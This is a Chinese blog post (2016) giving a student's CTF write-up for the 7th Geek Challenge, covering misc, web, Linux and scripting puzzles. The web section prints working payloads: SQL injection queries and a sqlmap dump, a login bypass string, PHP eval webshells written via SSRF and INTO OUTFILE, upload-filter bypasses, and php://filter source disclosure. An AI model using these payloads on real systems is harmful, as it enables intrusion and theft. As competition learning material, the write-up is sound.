@@ -1,0 +1,819 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="Isron" />
+
+
+
+<meta name="description" content="第一次参加这样的比赛，写个write up平复一下心情">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第七季极客大挑战">
+<meta property="og:url" content="https://clearloveqaq.github.io/2016/10/21/第七季极客大挑战/index.html">
+<meta property="og:site_name" content="Isron">
+<meta property="og:description" content="第一次参加这样的比赛，写个write up平复一下心情">
+<meta property="og:image" content="http://i1.piimg.com/567571/b53c0ebf5552a22a.png">
+<meta property="og:updated_time" content="2016-11-14T08:27:37.017Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="第七季极客大挑战">
+<meta name="twitter:description" content="第一次参加这样的比赛，写个write up平复一下心情">
+<meta name="twitter:image" content="http://i1.piimg.com/567571/b53c0ebf5552a22a.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Isron" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/111.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>第七季极客大挑战 | Isron</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: undefined
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+    <script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-56ff76c972fc0cf9"></script>
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?d225745dd35ee207c5a863746000dcea";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/111.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Isron</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">The dream is to be realized.</p>
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="https://mail.qq.com/cgi-bin/frame_html?sid=mNwN2kOtKnfYdjpt&r=745214a32ef2dee5dd3d9b17d5d30fd0" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" href="http://weibo.com/3262993654/profile?rightmod=1&wvr=6&mod=personinfo&is_all=1" title="新浪微博"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/clearloveQAQ" title="GitHub"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL/">SQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WAF/">WAF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/读书笔记/">读书笔记</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://rcoil.me">RcoIl</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">一个正在学习的菜鸡</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Isron</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/111.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Isron</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">The dream is to be realized.</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="https://mail.qq.com/cgi-bin/frame_html?sid=mNwN2kOtKnfYdjpt&r=745214a32ef2dee5dd3d9b17d5d30fd0" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" target="_blank" href="http://weibo.com/3262993654/profile?rightmod=1&wvr=6&mod=personinfo&is_all=1" title="新浪微博"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/clearloveQAQ" title="GitHub"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-第七季极客大挑战" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/10/21/第七季极客大挑战/" class="article-date">
+      <time datetime="2016-10-21T02:32:23.000Z" itemprop="datePublished">2016-10-21</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      第七季极客大挑战
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>第一次参加这样的比赛，写个write up平复一下心情<br><a id="more"></a></p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="闪得好快"><a href="#闪得好快" class="headerlink" title="闪得好快"></a>闪得好快</h3><p>第一次用火狐打开发现是一堆乱码，然后换用360变成了一个下载链接，是一个gif图，像素应该是280*280，改下像素，然后分帧，得到单个的图片，一个一个的扫码。</p>
+<h3 id="Come-game"><a href="#Come-game" class="headerlink" title="Come_game"></a>Come_game</h3><p>第一次做直接玩通关了，竟然真的有flag，但是我死了400多次= =，仔细去审下题，有一个save存档，把000132直接改为000135即可通关。</p>
+<h3 id="snow"><a href="#snow" class="headerlink" title="snow"></a>snow</h3><p>提示为html隐写，好吧百度一下，有个链接<a href="http://fog.misty.com/perry/ccs/snow/snow/snow.html" target="_blank" rel="external">snow html隐写</a><br>进去把网页跟key输进去即可得到flag</p>
+<h3 id="旋转跳跃"><a href="#旋转跳跃" class="headerlink" title="旋转跳跃"></a>旋转跳跃</h3><p>提示有key，然后是音频文件，想到用MP3Stego<br><img src="http://i1.piimg.com/567571/b53c0ebf5552a22a.png" alt=""><br>解密可得到一个txt文件里面就是flag</p>
+<h3 id="凯撒部长的奖励"><a href="#凯撒部长的奖励" class="headerlink" title="凯撒部长的奖励"></a>凯撒部长的奖励</h3><p>一长串凯撒密码，分享一个链接<a href="http://planetcalc.com/1434/" target="_blank" rel="external">凯撒密码解密</a>可以把26种情况全部列出来</p>
+<h3 id="MD5cracker"><a href="#MD5cracker" class="headerlink" title="MD5cracker"></a>MD5cracker</h3><p>放到MD5解密里面说不说正常的MD5，然后看了下确实是32位，发现有一个字符是|将其改为1，得出flag</p>
+<h3 id="PEN-AND-APPLE"><a href="#PEN-AND-APPLE" class="headerlink" title="PEN_AND_APPLE"></a>PEN_AND_APPLE</h3><p>提示与type有关，并没有想到其他的东西，然后RcoIl同学提示说是NTFS流文件，百度一下，原来type命令可以隐藏信息</p>
+<pre><code>type 2.txt&gt;1.txt: shujuliu.txt,回车.即可将文件2.txt的内容加入1.txt, 内容以数据流方式保存,该数据流名为shujuliu.txt
+</code></pre><p>用alternatestreamview可以提取出里面的东西发现有张flag图片</p>
+<h3 id="藏着小秘密的流量包"><a href="#藏着小秘密的流量包" class="headerlink" title="藏着小秘密的流量包"></a>藏着小秘密的流量包</h3><p>下载发现是一个14M的流量包，感觉很奇怪，也太大了吧，放到kali里面用binwalk查一下发现里面藏了好多东西，然后foremost提取一下，得到一个flag的压缩包解压就可得到flag</p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="web-1"><a href="#web-1" class="headerlink" title="web_1"></a>web_1</h3><p>考基础知识，查看响应头发现flag在里面</p>
+<h3 id="web-2"><a href="#web-2" class="headerlink" title="web_2"></a>web_2</h3><p>进去发现说我不是admin，然后用burpsuite抓下包，把邮箱改为admin发现还是不行，看到后面有个root应该是权限的意思将0改为1，便得到了flag</p>
+<h3 id="Social-Engineeing"><a href="#Social-Engineeing" class="headerlink" title="Social Engineeing"></a>Social Engineeing</h3><p>之前思路一直是在找百度id上面，以为要从百度id里面得到帖子，里面有flag= =，却忘了最重要的社工库，还好RcoIl同学告诉我，从社工库里面找到名字然后，域名，然后进行whois查询，具体流程如下：<br>通过挂VPN访问社工库<a href="http://s.70sec.com/" target="_blank" rel="external">http://s.70sec.com/</a> 得到邮箱名字为肖力，然后去百度贴吧发现有一个肖力吧里面写了一个qq号，刚开始以为加qq就能得到flag，跟他私聊并没有理我= =，然后看到资料里有个域名通过whois反查得到邮箱Google一下邮箱发现有一个奇怪的电话号码，想起题目里也有一个电话号码，提交即是flag</p>
+<h3 id="sql1"><a href="#sql1" class="headerlink" title="sql1"></a>sql1</h3><p>通过联合查询获取到表名与列名<br>查字段</p>
+<pre><code>?sycid=-2 union select 1,2,3
+select * from syc where sycid=-2 union select 1,2,3
+1-&gt;3-&gt;2 
+</code></pre><p>获取数据库名</p>
+<pre><code>?sycid=-2 union select 1,2,database()
+1-&gt;sycsqli1-&gt;2 
+</code></pre><p>获取表名</p>
+<pre><code>?sycid=-2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&apos;sycsqli1&apos;
+1-&gt;#FL4G#,syc-&gt;2  
+</code></pre><p>获取列名</p>
+<pre><code>?sycid=-2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;%23%46%4C%34%47%23&apos;
+1-&gt;id,flag-&gt;2 
+</code></pre><p>然后进行flag查询</p>
+<pre><code>?sycid=-2 union select 1,2,flag from %23%46%4C%34%47%23
+</code></pre><p>并出不来结果#被当做了注释符<br>放到sqlmap里面跑一下</p>
+<pre><code>-u http://web.sycsec.com/d03e52c272e42e7c/?sycid=1 --dump -C flag -T #FL4G# -D sycsqli1
+</code></pre><p>爆出flag</p>
+<h3 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h3><p>发现是post型的先试下admin登录提示Login Failed，看下post的数据发现有个debug将0改为1出现了查询语句，然后考虑下构造万能密码</p>
+<pre><code>username=admin or 1=1 #
+&amp;password=dasd
+&amp;debug=1
+</code></pre><p>爆出信息为</p>
+<pre><code>SQL query: SELECT * FROM users WHERE username=&apos;admin or 1=1 #&apos; AND password=&apos;dasd&apos;
+</code></pre><p>注释符应该是被过滤掉了不能正常进行注释，然后考虑进行单引号完美闭合，不用注释符</p>
+<pre><code>username=admin&apos; or &apos;1&apos;=&apos;1 
+&amp;password=dasd
+&amp;debug=1
+</code></pre><p>得到flag</p>
+<h3 id="127-0-0-x"><a href="#127-0-0-x" class="headerlink" title="127.0.0.x"></a>127.0.0.x</h3><p>后面好多滴滴滴啊，刷新一下发现滴滴滴的数目会变换，然后用Python数下数目滴滴滴的数目在50-55之间随机，滴滴滴的数目应该就是x的值。试下得到flag</p>
+<h3 id="php-is-fun"><a href="#php-is-fun" class="headerlink" title="php_is_fun"></a>php_is_fun</h3><pre><code>&lt;?php
+if(isset($_GET) &amp;&amp; !empty($_GET)){
+    $url = $_GET[&apos;file&apos;];
+    $path = &quot;upload/&quot;.$_GET[&apos;path&apos;];
+}else{
+    show_source(__FILE__);
+    exit();
+}
+
+if(strpos($path,&apos;..&apos;) &gt; -1){  //path不能存在../防止跨文件上传
+    die(&apos;SYCwaf!&apos;);
+}
+
+if(strpos($url,&apos;http://127.0.0.1/&apos;) === 0){ //file开头应为http://127.0.0.1/
+    file_put_contents($path, file_get_contents($url));
+    echo &quot;console.log($path update successed!)&quot;;
+}else{
+    echo &quot;Hello.Geeker&quot;;
+}
+</code></pre><p>最开始的想法是直接在file=<a href="http://127.0.0.1" target="_blank" rel="external">http://127.0.0.1</a> 后面加一句话</p>
+<pre><code>http://game.sycsec.com:50084/?file=http://127.0.0.1/%3C?php%2520eval($_POST[%27shell%27]);?%3E&amp;path=123.php
+</code></pre><p>发现都被过滤掉了，然后看了下RcoIl的payload</p>
+<pre><code>http://game.sycsec.com:50084/?file=http://127.0.0.1/?file=http://127.0.0.1/%26path%3D%3C?php%2520eval($_POST[%27shell%27]);?%3E&amp;path=shell.php
+</code></pre><p>可以先尝试访问下</p>
+<pre><code>http://game.sycsec.com:50084/?file=http://127.0.0.1/&amp;path=%3C?php%2520eval($_POST[%27shell%27]);?%3E
+</code></pre><p>然后查看源代码发现它把一句话当做上传目录了然后在进行一次file path上传就把这个url作为了file上传，从而将一句话写入到了upload里<br>用木马连下就得到flag<br>借鉴RcoIl的话：<br>由于服务器在接收GET参数的时候本身就会对参数进行一次URL解码 , 因此需要对file参数进行两次URL编码然后再进行传递,其实这里有问题就只是空格,空格URL编码后为%20,但是因为这里进行了两次URL解码因此需要将空格的URL编码再进行编码最后再传递,其实也只需要对%20中的%进行URL编码是%25<br>补充一个get知识</p>
+<pre><code>在http协议中GET请求中如果包含多个参数 , 参数之间使用&amp;分隔 , 因此这里要对file参数中的&amp;进行处理 , 或者因为file就是一个完整的参数 , 可以将其整体进行URL编码 , 然后再进行参数的传递
+</code></pre><h3 id="撸啊撸"><a href="#撸啊撸" class="headerlink" title="撸啊撸"></a>撸啊撸</h3><p>刚开始做这个题目，提示说任意下载，然后右键保存图片，出来一个png文件，一脸懵逼.PNG，想半天不知道怎么做，然后就去看了下RcoIl哥哥的write up，说发现一个download.php，然而我还是没有发现= =，点了下图片，发现是可以点的，WTF，Isron卒。<br>因为是任意下载啦，就用download.php把源码下载下来。</p>
+<pre><code>http://lol.sycsec.com/download.php?display.php
+</code></pre><p>源码：</p>
+<pre><code>&lt;?php
+    error_reporting(0);
+    $config = include &quot;config.inc.php&quot;;
+
+    if (isset($_GET[&apos;id&apos;])){
+        $id = intval($_GET[&apos;id&apos;]);
+        $conn = mysqli_connect($config[&apos;db_host&apos;],$config[&apos;db_user&apos;],$config[&apos;db_pwd&apos;],$config[&apos;database&apos;]);
+
+        if (mysqli_connect_errno($conn)){
+            die(&quot;Can not connect mysql!&quot;.mysqli_connect_error());
+        }
+
+        $sql = &quot;SELECT path FROM images WHERE id={$id}&quot;;
+        $result = mysqli_query($conn,$sql);
+        $row = mysqli_fetch_array($result,MYSQLI_ASSOC);
+        $path = $row[&apos;path&apos;];
+    } else{
+        die(&apos;Missing parameter id&apos;);
+    }
+?&gt;
+</code></pre><p>发现有一个include函数：</p>
+<pre><code>include说明：
+在 PHP 中，您能够在服务器执行 PHP 文件之前把该文件插入另一个 PHP 文件中。
+</code></pre><p>也就是说还有一个cofig.inc.php文件，接着下载：</p>
+<pre><code>&lt;?php
+return array(
+    &apos;db_host&apos; =&gt; &apos;localhost&apos;,
+    &apos;db_user&apos; =&gt; &apos;syclol&apos;,
+    &apos;db_pwd&apos; =&gt; &apos;fJBGpEfu3wWLvNHB&apos;,
+    &apos;database&apos; =&gt; &apos;syclol&apos;
+);
+</code></pre><p>发现是一个数据库信息，说明是存在注入的，抓下包发现有一个api.php去获取图片，那就接着下载吧= =</p>
+<pre><code>&lt;?php
+    error_reporting(0);
+    include &quot;json.php&quot;;
+    $config = include &quot;config.inc.php&quot;;
+
+    if (isset($_GET[&apos;img_first&apos;]) and isset($_GET[&apos;img_num&apos;])){
+        $img_first = $_GET[&apos;img_first&apos;];
+        $img_num = $_GET[&apos;img_num&apos;];
+        $conn = mysqli_connect($config[&apos;db_host&apos;],$config[&apos;db_user&apos;],$config[&apos;db_pwd&apos;],$config[&apos;database&apos;]);
+
+        if (mysqli_connect_errno($conn)){
+            die(&quot;Can not connect mysql!&quot;.mysqli_connect_error());
+        }
+
+        $check = is_numeric($img_num) and is_numeric($img_first);
+
+        if (!$check){
+            $img_num = intval($img_num);
+            $img_first = intval($img_first);
+        }
+
+        $sql = &quot;SELECT * FROM images LIMIT $img_first,$img_num&quot;;
+        $result = mysqli_query($conn,$sql);
+
+        $i = 0;
+        while($row=mysqli_fetch_array($result,MYSQLI_ASSOC)){
+            $rows[$i] = $row;
+            $i++;
+        }
+        $json = new Services_JSON();
+        echo $json-&gt;encode(array(&apos;result&apos;=&gt;$rows));
+        //echo json_encode(array(&apos;result&apos;=&gt;$rows),JSON_UNESCAPED_SLASHES);
+    }else {
+        die(&quot;Missing parameter img_first or img_num&quot;);
+    }
+</code></pre><p>发现有sql语句：</p>
+<pre><code>$sql = &quot;SELECT * FROM images LIMIT $img_first,$img_num&quot;;
+</code></pre><p>引用下我大哥的话：</p>
+<pre><code>既然是程序和用户交互的地方，因为这种地方在参数传递的时候没有对参数的类型和正确性进行判断，那就会留给我们利用的余地。
+$check = is_numeric($img_num) and is_numeric($img_first);
+if (!$check){
+        $img_num = intval($img_num);
+        $img_first = intval($img_first);
+根据运算优先级知道，$check 这个变量的值就只取决于 $img_num.所以只要满足$img_num，就相当于$check也满足了。而剩下的$img_first就可以用来构造我们所需要的语句了。
+</code></pre><p>最开始的思路是通过注入爆出flag，然后发现出了一堆没用的数据，我大哥的一航同学说，能注入，可以试着利用注入去写入= =，之前我是学过这部分的，咋没想到呢，还是做太少了。。。。<br>然后通过：</p>
+<pre><code>http://lol.sycsec.com/api.php?img_num=0&amp;img_first=0%20union%20select%201,@@datadir--+
+</code></pre><p>爆出数据库的路径是\/var\/lib\/mysql发现是linux系统，然后用默认路径去试下</p>
+<pre><code>http://lol.sycsec.com/api.php?img_num=0&amp;img_first=0%20union%20select%201,%22%3C?php%20eval($_POST[%27admin%27]);?%3E%22%20into%20outfile%20%22/var/www/html/wer.php%22--+
+</code></pre><p>并没有写入，然后试下images文件夹</p>
+<pre><code>http://lol.sycsec.com/api.php?img_num=0&amp;img_first=0%20union%20select%201,%22%3C?php%20eval($_POST[%27admin%27]);?%3E%22%20into%20outfile%20%22/var/www/html/images/wer.php%22--+
+</code></pre><p>写入成功 菜刀连接得到flag</p>
+<h3 id="上传-1"><a href="#上传-1" class="headerlink" title="上传(1)"></a>上传(1)</h3><p>尝试各种文件路径 00截断，都不行，因为之前做过百度杯的上传，试了下pht，发现提示离答案更近一步，百度了一下pht上传绕过发现相同的有</p>
+<pre><code>php3、php4、php5、phtml、pht
+</code></pre><p>试前面几个还是离答案更近，最后试了下phtm得到flag，在linux里，上面的都可以解析为php文件。</p>
+<h3 id="上传-2"><a href="#上传-2" class="headerlink" title="上传(2)"></a>上传(2)</h3><p>第一个题目做出来之后给了一个url，去访问了一下发现是自己之前上传的东西，想到去构造一句话木马连接。然后上传一句话访问一下得到了一个</p>
+<pre><code>eval($_POST[&apos;admin&apos;])
+</code></pre><p>可以得知php被过滤了，因为之前百度杯做过一样的题目，所以用当时的绕过php的一句话</p>
+<pre><code>&lt;script language=&quot;phP&quot;&gt; @eval($_POST[&apos;1111&apos;]);&lt;/script&gt;
+&lt;script language=&quot;PHP&quot;&gt;require_once(&quot;$_POST[id]&quot;) ;&lt;/script&gt;
+</code></pre><p>有两个，百度杯是第二个，这个题目是第一个，所以都写下来吧。<br>连接得到flag</p>
+<h3 id="人生苦短"><a href="#人生苦短" class="headerlink" title="人生苦短"></a>人生苦短</h3><p>根据题目可以得知这题需要用Python，因为 人生苦短，我用Python 嘿嘿嘿 根据提示得到一大串base编码，先用base64解了下发现是乱码，因为在南邮上有相似的题想到base64,32,16混合加密，用Python试了下，发现是base32跟base64的混合加密<br>写个小程序跑下得到flag</p>
+<pre><code>import base64
+code1 = &apos;base编码&apos;
+for i in range(0,10):
+    code2 = base64.b32decode(code1)
+    code1 = base64.b64decode(code2)
+print(code1)
+</code></pre><h3 id="狗师傅的计算机"><a href="#狗师傅的计算机" class="headerlink" title="狗师傅的计算机"></a>狗师傅的计算机</h3><p>进入链接得到一串神秘代码，百度一下得知是brainfuck代码，然后找一个brainfuck编码器解出这一串代码为welcome.php，根据提示进到一个syc.php界面，并找不到flag，然后扫了下这个url发现他的robots.txt是开着的，进入得到源代码</p>
+<pre><code>&lt;?php
+//竟然知道brain fuck 和 robots.txt 狗师傅咬你哦 -.-
+//这时候狗师傅叼着下面的源码冲到你的面前，审啊，审不出就咬
+//-.-
+    $num1=$_REQUEST[&apos;num1&apos;];
+
+    $num2=$_REQUEST[&apos;num2&apos;];
+
+    $oper=$_REQUEST[&apos;oper&apos;];
+
+    $str=$_GET[&apos;syc&apos;];
+
+    $pos=strpos($str,&apos;/&apos;);    
+    if(0===$pos)
+    {
+        die(&apos;Do not hack master go :)&apos;);
+    }
+    if(strpos($str ,&apos;..&apos;) &gt; -1 || strops($str , &apos;=/&apos;) &gt; -1){
+    die(&apos;Do not hack master go :)&apos;); 
+    }
+
+    $result=include($str . &quot;.php&quot;);
+
+    //echo $str;
+
+    $res=0;
+    switch($oper){
+        case &quot;+&quot;:
+            $res=$num1+$num2;
+            break;
+        case &quot;-&quot;:
+            $res=$num1-$num2;
+            break;
+        case &quot;*&quot;:
+            $res=$num1*$num2;
+            break;
+        case &quot;/&quot;:
+            $res=$num1/$num2;
+            break;
+        default:
+            echo &apos;&lt;br/&gt;no data!&apos;;
+
+    }
+    echo &apos;&lt;br/&gt;result=&apos;.$res ;
+
+?&gt; 
+&lt;br/&gt;
+&lt;a href=&quot;syc.php&quot;&gt;算对了你也找不到flag -.-&lt;/a&gt;
+&lt;br/&gt;
+&lt;a
+href=&quot;robot.txt&quot;&gt;你对php实现计算器感兴趣么,来这里看看
+:) &lt;/a&gt;
+</code></pre><p>审计发现有一个get请求并且过滤掉了../，想到文件包含用php filter流的文件包含构造如下payload</p>
+<pre><code>http://game.sycsec.com:50085/result.php?syc=php://filter/convert.base64-encode/resource=syc.php
+</code></pre><p>然后返回no data = =<br>重新看下编码发现 $result=include($str . “.php”); 也就是说会自动加上.php，重新构造</p>
+<pre><code>http://game.sycsec.com:50085/result.php?syc=php://filter/convert.base64-encode/resource=syc
+</code></pre><p>得到syc.php的源代码的base64编码，解码得到flag</p>
+<h3 id="你是人间四月天"><a href="#你是人间四月天" class="headerlink" title="你是人间四月天"></a>你是人间四月天</h3><p>抓包发现url为</p>
+<pre><code>http://game.sycsec.com:50080/9392d16bb9fbda00/index.php?sel=no
+</code></pre><p>把no改成yes得到</p>
+<pre><code>算你识相
+但是你还是不相信我是百度！！！
+</code></pre><p>想到应该去伪造一个百度，之前在南邮上面做过Google的是在referer里面伪造Google，这个试了下不行，提示说headers host 知道了应该去伪造host内容，然后得到一个新界面url为</p>
+<pre><code>http://game.sycsec.com:50080/9392d16bb9fbda00/index.php?selfjtfwef=yes
+</code></pre><p>这次把yes改为no得到flag<br>headers host：</p>
+<pre><code>一个IP地址可以对应多个域名: 一台虚拟主机(服务器)只有一个ip，上面可以放成千上万个网站。当对这些网站的请求到来时，服务器根据Host这一行中的值来确定本次请求的是哪个具体的网站
+</code></pre><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="linux1-2"><a href="#linux1-2" class="headerlink" title="linux1,2"></a>linux1,2</h3><p>题目提示的是docker镜像，因为从来没接触过docker，所以去百度了一下，原来是linux下的一个容器，我自己的虚拟机只有kali，跟redhat，都没有docker，然后百度下centos跟Ubuntu比较支持docker，之前接触了一点Ubuntu所以就去下载了一个ubuntu= =，然而并不会用，还好RcoIl哥哥给了我一个关于docker使用的网站，那就分享一下啦<a href="http://wangzhezhe.github.io/blog/2015/08/10/docker-operations/" target="_blank" rel="external">docker基础命令</a><br>列一下我这次用到的命令</p>
+<pre><code>sudo apt-get install docker //安装docker
+docker load -i geek_linux.tar //载入镜像
+docker images -a  //查看所有镜像
+docker run -i -t IMAGE ID  //根据刚才查到的ID，去运行镜像
+</code></pre><p>运行镜像完成后去遍历了一下目录，在/usr/local/etc/里面有一个geek目录，然后ls并没有东西出来，RcoIl哥哥是用find -name “.*”查了下是不是隐藏文件，然后用vim打开，我就比较暴力了，直接去压缩包里面看了下有一个.flag的文件打开就得到了flag= =<br>然后让接着找有一个flag文件，就在root目录下找到了一个F1Ag2.swp，百度了一下，是vim异常退出产生的临时文件</p>
+<pre><code>vim -r F1Ag2.swp  //恢复swp文件
+</code></pre><p>打开得到flag</p>
+<h2 id="Program"><a href="#Program" class="headerlink" title="Program"></a>Program</h2><h3 id="compress300"><a href="#compress300" class="headerlink" title="compress300"></a>compress300</h3><p>解压300次，先是用zipfile 提示不是zip文件，然后去获取了一下文件类型，得到文件类型为tar，当时不知道有tarfile这个函数，然后看下RcoIl的脚本，得知还有tarfile，刚开始还以为要改后缀名，后来发现Python可以自动识别，然后用脚本进行解压，发现解压到295就停止了，看下295的源码发现是zip文件，得到300个应该有zip，有tar，直接借鉴RcoIl哥哥的脚本：</p>
+<pre><code>import tarfile
+import zipfile
+for i in range(1,301)[::-1]: #循环一次i减一
+    path=str(i)
+    try:                          #解压tar
+        tar = tarfile.open(path) 
+        tar.extractall()
+    except:
+        pass
+    try:                          #解压zip
+        zip = zipfile.ZipFile(path)
+        zip.extractall()
+    except:
+        pass
+</code></pre><h3 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a>单身二十年</h3><p>根据题目可知要写一个脚本，去获取@值并上传，直接上脚本吧</p>
+<pre><code>import requests
+s=requests.session()
+url=&apos;http://web.sycsec.com/0b3a7c6ca7f1f2e6/&apos;
+url2=&apos;http://web.sycsec.com/0b3a7c6ca7f1f2e6/judge.php&apos;
+qqq=s.get(url).content #通过requests获取到网页源代码
+a = qqq.count(&apos;@&apos;)-1   #利用count计数器获取@值
+post = {&apos;mytext&apos;:a}    #构造post数据
+q = s.post(url2,data=post) #上传post数据到url2
+print q.content.decode(&apos;utf-8&apos;) #输出返回值
+</code></pre><h2 id="米有做出来的题目"><a href="#米有做出来的题目" class="headerlink" title="米有做出来的题目"></a>米有做出来的题目</h2><h3 id="我好菜啊-杂项部分"><a href="#我好菜啊-杂项部分" class="headerlink" title="我好菜啊_杂项部分"></a>我好菜啊_杂项部分</h3><p>拿到题目知道是异或，也知道异或需要两个文件才能进行，看了write up才想到去找一个正常的png图片去进行异或= =用到的脚本</p>
